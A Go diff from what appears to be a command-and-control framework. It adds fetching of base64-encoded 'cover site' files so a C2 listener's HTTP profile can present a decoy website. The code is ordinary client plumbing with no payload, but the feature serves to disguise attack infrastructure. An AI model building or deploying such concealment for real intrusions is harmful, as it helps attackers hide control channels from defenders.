@@ -1347,6 +1347,53 @@ type HTTPProfileAssignment struct {
 	Name     string          `json:"name"`
 	Revision int64           `json:"revision"`
 	Document json.RawMessage `json:"document"`
+	// SiteRevision is the newest cover-site timestamp, 0 when the profile has
+	// none. The site itself is fetched separately only when this is non-zero.
+	SiteRevision int64 `json:"site_revision,omitempty"`
+}
+
+// HTTPProfileSiteFile is one file of a cover site as Archon sends it.
+type HTTPProfileSiteFile struct {
+	Path        string `json:"path"`
+	ContentType string `json:"content_type"`
+	Content     string `json:"content"`
+}
+
+// FetchHTTPProfileSite retrieves the cover site attached to a profile this
+// server is assigned. Called only when the assignment reports a site revision,
+// so profiles without one cost no extra request.
+func (mc *MasterClient) FetchHTTPProfileSite(name string) (*HTTPSite, error) {
+	endpoint := fmt.Sprintf("/api/dns-server/http-profile-site?dns_server_id=%s&api_key=%s&name=%s",
+		mc.serverID, mc.apiKey, url.QueryEscape(name))
+
+	respData, err := mc.doRequest("GET", endpoint, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch cover site for %q: %w", name, err)
+	}
+
+	var resp struct {
+		Success  bool                  `json:"success"`
+		Message  string                `json:"message"`
+		Name     string                `json:"name"`
+		Revision int64                 `json:"revision"`
+		Files    []HTTPProfileSiteFile `json:"files"`
+	}
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return nil, fmt.Errorf("failed to parse cover site for %q: %w", name, err)
+	}
+	if !resp.Success {
+		return nil, fmt.Errorf("cover site for %q rejected: %s", name, resp.Message)
+	}
+
+	site := &HTTPSite{Revision: resp.Revision, Files: make(map[string]HTTPSiteFile, len(resp.Files))}
+	for _, file := range resp.Files {
+		content, decodeErr := base64.StdEncoding.DecodeString(file.Content)
+		if decodeErr != nil {
+			return nil, fmt.Errorf("cover site file %q is not valid base64: %w", file.Path, decodeErr)
+		}
+		site.Files[file.Path] = HTTPSiteFile{Content: content, ContentType: file.ContentType}
+	}
+	return site, nil
 }
 
 // FetchHTTPProfiles retrieves the profiles assigned to this DNS server.
@@ -1394,6 +1441,19 @@ func (mc *MasterClient) FetchHTTPProfiles() ([]*HTTPProfile, error) {
 		// what a detach will name.
 		profile.Name = assignment.Name
 		profile.SourcePath = ""
+
+		// A cover site travels separately: the assignment only carries its
+		// revision. Fetch failures leave the C2 listener working without a site
+		// rather than rejecting the whole profile.
+		if assignment.SiteRevision > 0 {
+			site, siteErr := mc.FetchHTTPProfileSite(profile.Name)
+			if siteErr != nil {
+				logf("[HTTP] Cover site for %q could not be fetched: %v", assignment.Name, siteErr)
+			} else {
+				profile.Site = site
+			}
+		}
+
 		profiles = append(profiles, &profile)
 	}
 
